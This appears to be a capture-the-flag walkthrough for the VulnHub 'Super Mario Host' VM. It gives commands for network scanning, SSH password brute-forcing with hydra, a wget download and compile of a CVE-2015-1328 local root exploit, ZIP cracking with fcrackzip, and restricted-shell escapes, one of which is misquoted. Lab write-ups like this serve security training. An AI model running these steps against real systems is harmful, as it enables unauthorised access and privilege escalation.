# [VMHacking] Super Mario Host

[Hacking Article link](http://www.hackingarticles.in/hack-super-mario-ctf-challenge/)

[VM Download](https://www.vulnhub.com/entry/super-mario-host-101,186/)




</br>



##  Scanning

```
$ nmap -sn 192.168.0.25/24
$ nmap -p- -A 192.168.0.27
```

* **-A :** Active detection of the operating system
* **-sn :** Ping Scan - Disable port scan




</br>



## Testing web server

- Using `dirb` to bruteforce web directory

- Tips:

  - Article : [Five way to brute force web dir](http://www.hackingarticles.in/5-ways-directory-bruteforcing-web-server/)

  - Access to the webserver with an domain:

    ```sh
    # File: /etc/host

    192.168.0.25	mario.supermariohost.local
    ```




</br>



## Generate a wordlist from a `user` file

*`john` software allow you to generate a wordlist from a file containing some entry* 

```sh
$ john --wordlist:user --rules --stdout > pass
```



</br>



## Bruteforce SSH with dictionary

```sh
$ hydra -L user -P pass 192.168.0.27 ssh
```



</br>



## Exploit: [CVE-2015-1328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)

```sh
$ wget -O mario.c https://www.exploit-db.com/download/37292.c
$ gcc mario.c -o mario
$ ./mario
```



</br>



## Cracking a ZIP file

*Download [rockyou](http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt) dictionary*

```sh
$ fcrackzip flag.zip -D -p /user/share/wordlist/rockyou.txt -u
```

* **-D :** Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1))
* **-p :** Specify dictionary file
* **-u :** Try to decompress the first file by calling `unzip` with the guessed password. This weeds out false positives when not enough files have been given.




</br>



## Bypassing limited shell

```sh
# On Vim
:set shell=/bin/bash
:shell
# ||
:! /bin/bash
```
```sh
# With awk
$ awk 'BEGIN {system("/bin/sh")}'
```
```sh
# With find
$ find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
```sh
# With more/less (put this on a file)
'! /bin/sh'
'!/bin/sh'
'!bash'
```
```sh
# With tee
$ echo "evil script code" | tee script.sh
```

*[Source link](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)*

